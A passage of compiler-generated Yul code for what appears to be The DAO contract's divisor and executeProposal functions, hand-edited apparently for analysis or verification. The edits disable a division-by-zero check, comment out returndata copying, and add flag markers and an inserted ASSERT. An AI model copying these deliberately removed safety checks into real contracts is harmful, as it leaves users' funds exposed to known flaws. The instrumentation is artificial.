                            x := cleanup_t_uint256(x)
                            y := cleanup_t_uint256(y)
                            diff := sub(x, y)
                            if gt(diff, x) { panic_error_0x11() }

                        }

                        function cleanup_t_rational_345600_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_345600_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_345600_by_1(value)))
                        }

                        function cleanup_t_rational_30_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_30_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_30_by_1(value)))
                        }

                        function cleanup_t_rational_86400_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_86400_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_86400_by_1(value)))
                        }

                        function panic_error_0x12() {
                            mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                            mstore(4, 0x12)
                            revert(0, 0x24)
                        }

                        function checked_div_t_uint256(x, y) -> r {
                            x := cleanup_t_uint256(x)
                            y := cleanup_t_uint256(y)
                            // NOTE: I'm removing this because the original DAO divides by zero as
                            // intended behaviour...
                            //if iszero(y) { panic_error_0x12() }

                            r := div(x, y)
                        }

                        function cleanup_t_rational_20_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_20_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_20_by_1(value)))
                        }

                        function checked_add_t_uint256(x, y) -> sum {
                            x := cleanup_t_uint256(x)
                            y := cleanup_t_uint256(y)
                            sum := add(x, y)

                            if gt(x, sum) { panic_error_0x11() }

                        }

                        /// @ast-id 694
                        /// @src 0:12782:13436  "function divisor() public view override returns (uint divisor_) {..."
                        function fun_divisor_694() -> var_divisor__655 {
                            /// @src 0:12831:12844  "uint divisor_"
                            let zero_t_uint256_15 := zero_value_for_split_t_uint256()
                            var_divisor__655 := zero_t_uint256_15
                            /// @src 0:13023:13034  "closingTime"
                            let _16 := read_from_storage_split_offset_0_t_uint256(0x00)
                            let expr_657 := _16
                            /// @src 0:13037:13044  "2 weeks"
                            let expr_658 := 0x127500
                            /// @src 0:13023:13044  "closingTime - 2 weeks"
                            let expr_659 := checked_sub_t_uint256(expr_657, convert_t_rational_1209600_by_1_to_t_uint256(expr_658))

                            /// @src 0:13047:13062  "block.timestamp"
                            let expr_661 := timestamp()
                            /// @src 0:13023:13062  "closingTime - 2 weeks > block.timestamp"
                            let expr_662 := gt(cleanup_t_uint256(expr_659), cleanup_t_uint256(expr_661))
                            /// @src 0:13019:13430  "if (closingTime - 2 weeks > block.timestamp) {..."
                            switch expr_662
                            case 0 {
                                /// @src 0:13181:13192  "closingTime"
                                let _17 := read_from_storage_split_offset_0_t_uint256(0x00)
                                let expr_666 := _17
                                /// @src 0:13195:13201  "4 days"
                                let expr_667 := 0x054600
                                /// @src 0:13181:13201  "closingTime - 4 days"
                                let expr_668 := checked_sub_t_uint256(expr_666, convert_t_rational_345600_by_1_to_t_uint256(expr_667))

                                /// @src 0:13204:13219  "block.timestamp"
                                let expr_670 := timestamp()
                                /// @src 0:13181:13219  "closingTime - 4 days > block.timestamp"
                                let expr_671 := gt(cleanup_t_uint256(expr_668), cleanup_t_uint256(expr_670))
                                /// @src 0:13177:13430  "if (closingTime - 4 days > block.timestamp) {..."
                                switch expr_671
                                case 0 {
                                    /// @src 0:13417:13419  "30"
                                    let expr_688 := 0x1e
                                    /// @src 0:13410:13419  "return 30"
                                    var_divisor__655 := convert_t_rational_30_by_1_to_t_uint256(expr_688)
                                    leave
                                    /// @src 0:13177:13430  "if (closingTime - 4 days > block.timestamp) {..."
                                }
                                default {
                                    /// @src 0:13243:13245  "20"
                                    let expr_672 := 0x14
                                    /// @src 0:13249:13264  "block.timestamp"
                                    let expr_674 := timestamp()
                                    /// @src 0:13268:13279  "closingTime"
                                    let _18 := read_from_storage_split_offset_0_t_uint256(0x00)
                                    let expr_675 := _18
                                    /// @src 0:13282:13289  "2 weeks"
                                    let expr_676 := 0x127500
                                    /// @src 0:13268:13289  "closingTime - 2 weeks"
                                    let expr_677 := checked_sub_t_uint256(expr_675, convert_t_rational_1209600_by_1_to_t_uint256(expr_676))

                                    /// @src 0:13267:13290  "(closingTime - 2 weeks)"
                                    let expr_678 := expr_677
                                    /// @src 0:13249:13290  "block.timestamp - (closingTime - 2 weeks)"
                                    let expr_679 := checked_sub_t_uint256(expr_674, expr_678)

                                    /// @src 0:13248:13291  "(block.timestamp - (closingTime - 2 weeks))"
                                    let expr_680 := expr_679
                                    /// @src 0:13295:13301  "1 days"
                                    let expr_681 := 0x015180
                                    /// @src 0:13294:13302  "(1 days)"
                                    let expr_682 := expr_681
                                    /// @src 0:13248:13302  "(block.timestamp - (closingTime - 2 weeks)) / (1 days)"
                                    let expr_683 := checked_div_t_uint256(expr_680, convert_t_rational_86400_by_1_to_t_uint256(expr_682))

                                    /// @src 0:13243:13302  "20 + (block.timestamp - (closingTime - 2 weeks)) / (1 days)"
                                    let expr_684 := checked_add_t_uint256(convert_t_rational_20_by_1_to_t_uint256(expr_672), expr_683)

                                    /// @src 0:13242:13303  "(20 + (block.timestamp - (closingTime - 2 weeks)) / (1 days))"
                                    let expr_685 := expr_684
                                    /// @src 0:13235:13303  "return (20 + (block.timestamp - (closingTime - 2 weeks)) / (1 days))"
                                    var_divisor__655 := expr_685
                                    leave
                                    /// @src 0:13177:13430  "if (closingTime - 4 days > block.timestamp) {..."
                                }
                                /// @src 0:13019:13430  "if (closingTime - 2 weeks > block.timestamp) {..."
                            }
                            default {
                                /// @src 0:13085:13087  "20"
                                let expr_663 := 0x14
                                /// @src 0:13078:13087  "return 20"
                                var_divisor__655 := convert_t_rational_20_by_1_to_t_uint256(expr_663)
                                leave
                                /// @src 0:13019:13430  "if (closingTime - 2 weeks > block.timestamp) {..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function convert_t_struct$_Proposal_$800_storage_to_t_struct$_Proposal_$800_storage_ptr(value) -> converted {
                            converted := value
                        }

                        function cleanup_t_rational_864000_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_864000_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_864000_by_1(value)))
                        }

                        /// @src 0:15069:15114  "uint constant executeProposalPeriod = 10 days"
                        function constant_executeProposalPeriod_715() -> ret {
                            /// @src 0:15107:15114  "10 days"
                            let expr_714 := 0x0d2f00
                            let _28 := convert_t_rational_864000_by_1_to_t_uint256(expr_714)

                            ret := _28
                        }

                        function cleanup_t_rational_2332800_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_2332800_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_2332800_by_1(value)))
                        }

                        /// @src 0:14791:14835  "uint constant splitExecutionPeriod = 27 days"
                        function constant_splitExecutionPeriod_709() -> ret {
                            /// @src 0:14828:14835  "27 days"
                            let expr_708 := 0x239880
                            let _29 := convert_t_rational_2332800_by_1_to_t_uint256(expr_708)

                            ret := _29
                        }

                        function shift_left_96(value) -> newValue {
                            newValue :=

                            shl(96, value)

                        }

                        function leftAlign_t_uint160(value) -> aligned {
                            aligned := shift_left_96(value)
                        }

                        function leftAlign_t_address(value) -> aligned {
                            aligned := leftAlign_t_uint160(value)
                        }

                        function abi_encode_t_address_to_t_address_nonPadded_inplace_fromStack(value, pos) {
                            mstore(pos, leftAlign_t_address(cleanup_t_address(value)))
                        }

                        function leftAlign_t_uint256(value) -> aligned {
                            aligned := value
                        }

                        function abi_encode_t_uint256_to_t_uint256_nonPadded_inplace_fromStack(value, pos) {
                            mstore(pos, leftAlign_t_uint256(cleanup_t_uint256(value)))
                        }

                        function array_length_t_bytes_memory_ptr(value) -> length {

                            length := mload(value)

                        }

                        function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {
                            updated_pos := pos
                        }

                        function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {
                            let length := array_length_t_bytes_memory_ptr(value)
                            pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)
                            copy_memory_to_memory_with_cleanup(add(value, 0x20), pos, length)
                            end := add(pos, length)
                        }

                        function abi_encode_tuple_packed_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_uint256_t_bytes_memory_ptr__nonPadded_inplace_fromStack(pos , value0, value1, value2) -> end {

                            abi_encode_t_address_to_t_address_nonPadded_inplace_fromStack(value0,  pos)
                            pos := add(pos, 20)

                            abi_encode_t_uint256_to_t_uint256_nonPadded_inplace_fromStack(value1,  pos)
                            pos := add(pos, 32)

                            pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value2,  pos)

                            end := pos
                        }

                        function array_dataslot_t_bytes_memory_ptr(ptr) -> data {
                            data := ptr

                            data := add(ptr, 0x20)

                        }

                        function panic_error_0x01() {
                            mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                            mstore(4, 0x01)

                            // FLAG: THIS REVERT IS CALLED
                            // PRINT(11111111111111111111111111111111111111111111111)
                            revert(0, 0x24)
                        }

                        function assert_helper(condition) {
                            if iszero(condition) { panic_error_0x01() }
                        }

                        function convert_t_address_payable_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_address(value)
                        }

                        function revert_forward_1() {
                            let pos := allocate_unbounded()
                            //returndatacopy(pos, 0, returndatasize())
                            revert(pos, returndatasize())
                        }

                        function cleanup_t_rational_4_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_4_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_4_by_1(value)))
                        }

                        function memory_array_index_access_t_bytes_memory_ptr(baseRef, index) -> addr {
                            if iszero(lt(index, array_length_t_bytes_memory_ptr(baseRef))) {
                                panic_error_0x32()
                            }

                            let offset := mul(index, 1)

                            offset := add(offset, 32)

                            addr := add(baseRef, offset)
                        }

                        function cleanup_t_rational_0_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_0_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_0_by_1(value)))
                        }

                        function cleanup_t_bytes1(value) -> cleaned {
                            cleaned := and(value, 0xff00000000000000000000000000000000000000000000000000000000000000)
                        }

                        function read_from_memoryt_bytes1(ptr) -> returnValue {

                            let value := cleanup_t_bytes1(mload(ptr))

                            returnValue :=

                            value

                        }

                        function cleanup_t_rational_104_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function shift_left_248(value) -> newValue {
                            newValue :=

                            shl(248, value)

                        }

                        function convert_t_rational_104_by_1_to_t_bytes1(value) -> converted {
                            converted := cleanup_t_bytes1(shift_left_248(cleanup_t_rational_104_by_1(value)))
                        }

                        function cleanup_t_rational_1_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_1_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_1_by_1(value)))
                        }

                        function cleanup_t_rational_55_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_55_by_1_to_t_bytes1(value) -> converted {
                            converted := cleanup_t_bytes1(shift_left_248(cleanup_t_rational_55_by_1(value)))
                        }

                        function cleanup_t_rational_2_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_2_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_2_by_1(value)))
                        }

                        function cleanup_t_rational_255_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_255_by_1_to_t_bytes1(value) -> converted {
                            converted := cleanup_t_bytes1(shift_left_248(cleanup_t_rational_255_by_1(value)))
                        }

                        function cleanup_t_rational_3_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_3_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_3_by_1(value)))
                        }

                        function convert_t_rational_30_by_1_to_t_bytes1(value) -> converted {
                            converted := cleanup_t_bytes1(shift_left_248(cleanup_t_rational_30_by_1(value)))
                        }

                        function convert_t_contract$_DAO_$3021_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_address(value)
                        }

                        function cleanup_t_rational_5_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_5_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_5_by_1(value)))
                        }

                        function allocate_memory_array_t_bytes_memory_ptr(length) -> memPtr {
                            let allocSize := array_allocation_size_t_bytes_memory_ptr(length)
                            memPtr := allocate_memory(allocSize)

                            mstore(memPtr, length)

                        }

                        function zero_value_for_split_t_bytes_memory_ptr() -> ret {
                            ret := 96
                        }

                        function extract_returndata() -> data {

                            switch returndatasize()
                            case 0 {
                                data := zero_value_for_split_t_bytes_memory_ptr()
                            }
                            default {
                                data := allocate_memory_array_t_bytes_memory_ptr(returndatasize())
                                //returndatacopy(add(data, 0x20), 0, returndatasize())
                            }

                        }

                        function shift_left_8(value) -> newValue {
                            newValue :=

                            shl(8, value)

                        }

                        function update_byte_slice_1_shift_1(value, toInsert) -> result {
                            let mask := 65280
                            toInsert := shift_left_8(toInsert)
                            value := and(value, not(mask))
                            result := or(value, and(toInsert, mask))
                        }

                        function convert_t_bool_to_t_bool(value) -> converted {
                            converted := cleanup_t_bool(value)
                        }

                        function prepare_store_t_bool(value) -> ret {
                            ret := value
                        }

                        function update_storage_value_offset_1_t_bool_to_t_bool(slot, value_0) {
                            let convertedValue_0 := convert_t_bool_to_t_bool(value_0)
                            sstore(slot, update_byte_slice_1_shift_1(sload(slot), prepare_store_t_bool(convertedValue_0)))
                        }

                        function extract_from_storage_value_offset_0_t_contract$_ManagedAccount_$375(slot_value) -> value {
                            value := cleanup_from_storage_t_contract$_ManagedAccount_$375(shift_right_0_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(slot) -> value {
                            value := extract_from_storage_value_offset_0_t_contract$_ManagedAccount_$375(sload(slot))

                        }

                        function convert_t_contract$_ManagedAccount_$375_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_address(value)
                        }

                        function abi_encode_tuple_t_bool_t_uint256__to_t_bool_t_uint256__fromStack(headStart , value0, value1) -> tail {
                            tail := add(headStart, 64)

                            abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))

                            abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))

                        }

                        /// @ast-id 1911
                        /// @src 0:34315:37390  "function executeProposal(..."
                        function fun_executeProposal_1911(var__proposalID_1607, var__transactionData_1609_mpos) -> var__success_1613 {
                            /// @src 0:34436:34449  "bool _success"
                            let zero_t_bool_19 := zero_value_for_split_t_bool()
                            var__success_1613 := zero_t_bool_19

                            /// @src 0:34483:34492  "proposals"
                            let _20_slot := 0x08
                            let expr_1618_slot := _20_slot
                            /// @src 0:34493:34504  "_proposalID"
                            let _21 := var__proposalID_1607
                            let expr_1619 := _21
                            /// @src 0:34483:34505  "proposals[_proposalID]"

                            let _22, _23 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_1618_slot, expr_1619)
                            let _24_slot := _22
                            let expr_1620_slot := _24_slot
                            /// @src 0:34462:34505  "Proposal storage p = proposals[_proposalID]"
                            let var_p_1617_slot := convert_t_struct$_Proposal_$800_storage_to_t_struct$_Proposal_$800_storage_ptr(expr_1620_slot)
                            /// @src 0:34534:34535  "p"
                            let _25_slot := var_p_1617_slot
                            let expr_1624_slot := _25_slot
                            /// @src 0:34534:34546  "p.newCurator"
                            let _26 := add(expr_1624_slot, 7)
                            let _27 := read_from_storage_split_offset_0_t_bool(_26)
                            let expr_1625 := _27
                            /// @src 0:34534:34617  "p.newCurator..."
                            let expr_1628
                            switch expr_1625
                            case 0 {
                                /// @src 0:34596:34617  "executeProposalPeriod"
                                let expr_1627 := constant_executeProposalPeriod_715()
                                /// @src 0:34534:34617  "p.newCurator..."
                                expr_1628 := expr_1627
                            }
                            default {
                                /// @src 0:34561:34581  "splitExecutionPeriod"
                                let expr_1626 := constant_splitExecutionPeriod_709()
                                /// @src 0:34534:34617  "p.newCurator..."
                                expr_1628 := expr_1626
                            }
                            /// @src 0:34516:34617  "uint waitPeriod = p.newCurator..."
                            let var_waitPeriod_1623 := expr_1628
                            /// @src 0:34712:34713  "p"
                            let _30_slot := var_p_1617_slot
                            let expr_1630_slot := _30_slot
                            /// @src 0:34712:34718  "p.open"
                            let _31 := add(expr_1630_slot, 4)
                            let _32 := read_from_storage_split_offset_0_t_bool(_31)
                            let expr_1631 := _32
                            /// @src 0:34712:34769  "p.open && block.timestamp > p.votingDeadline + waitPeriod"
                            let expr_1639 := expr_1631
                            if expr_1639 {
                                /// @src 0:34722:34737  "block.timestamp"
                                let expr_1633 := timestamp()
                                /// @src 0:34740:34741  "p"
                                let _33_slot := var_p_1617_slot
                                let expr_1634_slot := _33_slot
                                /// @src 0:34740:34756  "p.votingDeadline"
                                let _34 := add(expr_1634_slot, 3)
                                let _35 := read_from_storage_split_offset_0_t_uint256(_34)
                                let expr_1635 := _35
                                /// @src 0:34759:34769  "waitPeriod"
                                let _36 := var_waitPeriod_1623
                                let expr_1636 := _36
                                /// @src 0:34740:34769  "p.votingDeadline + waitPeriod"
                                let expr_1637 := checked_add_t_uint256(expr_1635, expr_1636)

                                /// @src 0:34722:34769  "block.timestamp > p.votingDeadline + waitPeriod"
                                let expr_1638 := gt(cleanup_t_uint256(expr_1633), cleanup_t_uint256(expr_1637))
                                /// @src 0:34712:34769  "p.open && block.timestamp > p.votingDeadline + waitPeriod"
                                expr_1639 := expr_1638
                            }
                            /// @src 0:34708:34848  "if (p.open && block.timestamp > p.votingDeadline + waitPeriod) {..."
                            if expr_1639 {
                                /// @src 0:34799:34810  "_proposalID"
                                let _37 := var__proposalID_1607
                                let expr_1641 := _37
                                fun_closeProposal_1938(expr_1641)
                                /// @src 0:34832:34837  "false"
                                let expr_1644 := 0x00
                                /// @src 0:34825:34837  "return false"
                                var__success_1613 := expr_1644
                                leave
                                /// @src 0:34708:34848  "if (p.open && block.timestamp > p.votingDeadline + waitPeriod) {..."
                            }
                            /// @src 0:34917:34932  "block.timestamp"
                            let expr_1650 := timestamp()
                            /// @src 0:34935:34936  "p"
                            let _38_slot := var_p_1617_slot
                            let expr_1651_slot := _38_slot
                            /// @src 0:34935:34951  "p.votingDeadline"
                            let _39 := add(expr_1651_slot, 3)
                            let _40 := read_from_storage_split_offset_0_t_uint256(_39)
                            let expr_1652 := _40
                            /// @src 0:34917:34951  "block.timestamp < p.votingDeadline"
                            let expr_1653 := lt(cleanup_t_uint256(expr_1650), cleanup_t_uint256(expr_1652))
                            /// @src 0:34917:35055  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_1657 := expr_1653
                            if iszero(expr_1657) {
                                /// @src 0:35049:35050  "p"
                                let _41_slot := var_p_1617_slot
                                let expr_1654_slot := _41_slot
                                /// @src 0:35049:35055  "p.open"
                                let _42 := add(expr_1654_slot, 4)
                                let _43 := read_from_storage_split_offset_0_t_bool(_42)
                                let expr_1655 := _43
                                /// @src 0:35048:35055  "!p.open"
                                let expr_1656 := cleanup_t_bool(iszero(expr_1655))
                                /// @src 0:34917:35055  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                                expr_1657 := expr_1656
                            }
                            /// @src 0:34917:35218  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_1671 := expr_1657
                            if iszero(expr_1671) {
                                /// @src 0:35132:35133  "p"
                                let _44_slot := var_p_1617_slot
                                let expr_1658_slot := _44_slot
                                /// @src 0:35132:35146  "p.proposalHash"
                                let _45 := add(expr_1658_slot, 5)
                                let _46 := read_from_storage_split_offset_0_t_bytes32(_45)
                                let expr_1659 := _46
                                /// @src 0:35177:35178  "p"
                                let _47_slot := var_p_1617_slot
                                let expr_1663_slot := _47_slot
                                /// @src 0:35177:35188  "p.recipient"
                                let _48 := add(expr_1663_slot, 0)
                                let _49 := read_from_storage_split_offset_0_t_address(_48)
                                let expr_1664 := _49
                                /// @src 0:35190:35191  "p"
                                let _50_slot := var_p_1617_slot
                                let expr_1665_slot := _50_slot
                                /// @src 0:35190:35198  "p.amount"
                                let _51 := add(expr_1665_slot, 1)
                                let _52 := read_from_storage_split_offset_0_t_uint256(_51)
                                let expr_1666 := _52
                                /// @src 0:35200:35216  "_transactionData"
                                let _53_mpos := var__transactionData_1609_mpos
                                let expr_1667_mpos := _53_mpos
                                /// @src 0:35160:35217  "abi.encodePacked(p.recipient, p.amount, _transactionData)"

                                let expr_1668_mpos := allocate_unbounded()
                                let _54 := add(expr_1668_mpos, 0x20)

                                let _55 := abi_encode_tuple_packed_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_uint256_t_bytes_memory_ptr__nonPadded_inplace_fromStack(_54, expr_1664, expr_1666, expr_1667_mpos)
                                mstore(expr_1668_mpos, sub(_55, add(expr_1668_mpos, 0x20)))
                                finalize_allocation(expr_1668_mpos, sub(_55, expr_1668_mpos))
                                /// @src 0:35150:35218  "keccak256(abi.encodePacked(p.recipient, p.amount, _transactionData))"
                                let expr_1669 := keccak256(array_dataslot_t_bytes_memory_ptr(expr_1668_mpos), array_length_t_bytes_memory_ptr(expr_1668_mpos))
                                /// @src 0:35132:35218  "p.proposalHash != keccak256(abi.encodePacked(p.recipient, p.amount, _transactionData))"
                                let expr_1670 := iszero(eq(cleanup_t_bytes32(expr_1659), cleanup_t_bytes32(expr_1669)))
                                /// @src 0:34917:35218  "block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                                expr_1671 := expr_1670
                            }
                            /// @src 0:34916:35219  "(block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_1672 := expr_1671
                            /// @src 0:34915:35219  "!(block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            let expr_1673 := cleanup_t_bool(iszero(expr_1672))
                            /// @src 0:34907:35220  "assert (!(block.timestamp < p.votingDeadline  // has the voting deadline arrived?..."
                            assert_helper(expr_1673)
                            /// @src 0:35414:35415  "p"
                            let _56_slot := var_p_1617_slot
                            let expr_1677_slot := _56_slot
                            /// @src 0:35414:35425  "p.recipient"
                            let _57 := add(expr_1677_slot, 0)
                            let _58 := read_from_storage_split_offset_0_t_address(_57)
                            let expr_1678 := _58
                            /// @src 0:35395:35426  "isRecipientAllowed(p.recipient)"
                            let expr_1679 := fun_isRecipientAllowed_2819(expr_1678)
                            /// @src 0:35394:35426  "!isRecipientAllowed(p.recipient)"
                            let expr_1680 := cleanup_t_bool(iszero(expr_1679))
                            /// @src 0:35390:35552  "if (!isRecipientAllowed(p.recipient)) {..."
                            if expr_1680 {
                                /// @src 0:35456:35467  "_proposalID"
                                let _59 := var__proposalID_1607
                                let expr_1682 := _59
                                fun_closeProposal_1938(expr_1682)
                                /// @src 0:35482:35483  "p"
                                let _60_slot := var_p_1617_slot
                                let expr_1685_slot := _60_slot
                                /// @src 0:35482:35491  "p.creator"
                                let _61 := add(expr_1685_slot, 13)
                                let _62 := read_from_storage_split_offset_0_t_address_payable(_61)
                                let expr_1688 := _62
                                /// @src 0:35482:35496  "p.creator.send"
                                let expr_1689_address := convert_t_address_payable_to_t_address(expr_1688)
                                /// @src 0:35497:35498  "p"
                                let _63_slot := var_p_1617_slot
                                let expr_1690_slot := _63_slot
                                /// @src 0:35497:35514  "p.proposalDeposit"
                                let _64 := add(expr_1690_slot, 6)
                                let _65 := read_from_storage_split_offset_0_t_uint256(_64)
                                let expr_1691 := _65
                                /// @src 0:35482:35515  "p.creator.send(p.proposalDeposit)"

                                let _66 := 0
                                if iszero(expr_1691) { _66 := 2300 }
                                let pbal := balance(address())
                                let expr_1692 := call(_66, expr_1689_address, expr_1691, 0, 0, 0, 0)
                                if lt(balance(address()),pbal) {
                                    ASSERT(eq(sub(pbal,expr_1691) , balance(address())))
                                }
                                
                                /// @src 0:35536:35541  "false"
                                let expr_1694 := 0x00
                                /// @src 0:35529:35541  "return false"
                                var__success_1613 := expr_1694
                                leave
                                /// @src 0:35390:35552  "if (!isRecipientAllowed(p.recipient)) {..."
                            }
                            /// @src 0:35583:35587  "true"
                            let expr_1700 := 0x01
                            /// @src 0:35562:35587  "bool proposalCheck = true"
                            let var_proposalCheck_1699 := expr_1700
                            /// @src 0:35602:35603  "p"
                            let _67_slot := var_p_1617_slot
                            let expr_1702_slot := _67_slot
                            /// @src 0:35602:35610  "p.amount"
                            let _68 := add(expr_1702_slot, 1)
                            let _69 := read_from_storage_split_offset_0_t_uint256(_68)
                            let expr_1703 := _69
                            /// @src 0:35613:35628  "actualBalance()"
                            let expr_1705 := fun_actualBalance_2833()
                            /// @src 0:35602:35628  "p.amount > actualBalance()"
                            let expr_1706 := gt(cleanup_t_uint256(expr_1703), cleanup_t_uint256(expr_1705))
                            /// @src 0:35598:35663  "if (p.amount > actualBalance())..."
                            if expr_1706 {
                                /// @src 0:35658:35663  "false"
                                let expr_1708 := 0x00
                                /// @src 0:35642:35663  "proposalCheck = false"
                                var_proposalCheck_1699 := expr_1708
                                let expr_1709 := expr_1708
                                /// @src 0:35598:35663  "if (p.amount > actualBalance())..."
                            }
                            /// @src 0:35688:35689  "p"
                            let _70_slot := var_p_1617_slot
                            let expr_1714_slot := _70_slot
                            /// @src 0:35688:35693  "p.yea"
                            let _71 := add(expr_1714_slot, 9)
                            let _72 := read_from_storage_split_offset_0_t_uint256(_71)
                            let expr_1715 := _72
                            /// @src 0:35696:35697  "p"
                            let _73_slot := var_p_1617_slot
                            let expr_1716_slot := _73_slot
                            /// @src 0:35696:35701  "p.nay"
                            let _74 := add(expr_1716_slot, 10)
                            let _75 := read_from_storage_split_offset_0_t_uint256(_74)
                            let expr_1717 := _75
                            /// @src 0:35688:35701  "p.yea + p.nay"
                            let expr_1718 := checked_add_t_uint256(expr_1715, expr_1717)

                            /// @src 0:35674:35701  "uint quorum = p.yea + p.nay"
                            let var_quorum_1713 := expr_1718
                            /// @src 0:35765:35781  "_transactionData"
                            let _76_mpos := var__transactionData_1609_mpos
                            let expr_1720_mpos := _76_mpos
                            /// @src 0:35765:35788  "_transactionData.length"
                            let expr_1721 := array_length_t_bytes_memory_ptr(expr_1720_mpos)
                            /// @src 0:35792:35793  "4"
                            let expr_1722 := 0x04
                            /// @src 0:35765:35793  "_transactionData.length >= 4"
                            let expr_1723 := iszero(lt(cleanup_t_uint256(expr_1721), convert_t_rational_4_by_1_to_t_uint256(expr_1722)))
                            /// @src 0:35765:35824  "_transactionData.length >= 4 && _transactionData[0] == 0x68"
                            let expr_1729 := expr_1723
                            if expr_1729 {
                                /// @src 0:35797:35813  "_transactionData"
                                let _77_mpos := var__transactionData_1609_mpos
                                let expr_1724_mpos := _77_mpos
                                /// @src 0:35814:35815  "0"
                                let expr_1725 := 0x00
                                /// @src 0:35797:35816  "_transactionData[0]"
                                let _78 := read_from_memoryt_bytes1(memory_array_index_access_t_bytes_memory_ptr(expr_1724_mpos, convert_t_rational_0_by_1_to_t_uint256(expr_1725)))
                                let expr_1726 := _78
                                /// @src 0:35820:35824  "0x68"
                                let expr_1727 := 0x68
                                /// @src 0:35797:35824  "_transactionData[0] == 0x68"
                                let expr_1728 := eq(cleanup_t_bytes1(expr_1726), convert_t_rational_104_by_1_to_t_bytes1(expr_1727))
                                /// @src 0:35765:35824  "_transactionData.length >= 4 && _transactionData[0] == 0x68"
                                expr_1729 := expr_1728
                            }
                            /// @src 0:35765:35867  "_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                            let expr_1735 := expr_1729
                            if expr_1735 {
                                /// @src 0:35840:35856  "_transactionData"
                                let _79_mpos := var__transactionData_1609_mpos
                                let expr_1730_mpos := _79_mpos
                                /// @src 0:35857:35858  "1"
                                let expr_1731 := 0x01
                                /// @src 0:35840:35859  "_transactionData[1]"
                                let _80 := read_from_memoryt_bytes1(memory_array_index_access_t_bytes_memory_ptr(expr_1730_mpos, convert_t_rational_1_by_1_to_t_uint256(expr_1731)))
                                let expr_1732 := _80
                                /// @src 0:35863:35867  "0x37"
                                let expr_1733 := 0x37
                                /// @src 0:35840:35867  "_transactionData[1] == 0x37"
                                let expr_1734 := eq(cleanup_t_bytes1(expr_1732), convert_t_rational_55_by_1_to_t_bytes1(expr_1733))
                                /// @src 0:35765:35867  "_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                                expr_1735 := expr_1734
                            }
                            /// @src 0:35765:35898  "_transactionData.length >= 4 && _transactionData[0] == 0x68..."
                            let expr_1741 := expr_1735
                            if expr_1741 {
                                /// @src 0:35871:35887  "_transactionData"
                                let _81_mpos := var__transactionData_1609_mpos
                                let expr_1736_mpos := _81_mpos
                                /// @src 0:35888:35889  "2"
                                let expr_1737 := 0x02
                                /// @src 0:35871:35890  "_transactionData[2]"
                                let _82 := read_from_memoryt_bytes1(memory_array_index_access_t_bytes_memory_ptr(expr_1736_mpos, convert_t_rational_2_by_1_to_t_uint256(expr_1737)))
                                let expr_1738 := _82
                                /// @src 0:35894:35898  "0xff"
                                let expr_1739 := 0xff
                                /// @src 0:35871:35898  "_transactionData[2] == 0xff"
                                let expr_1740 := eq(cleanup_t_bytes1(expr_1738), convert_t_rational_255_by_1_to_t_bytes1(expr_1739))
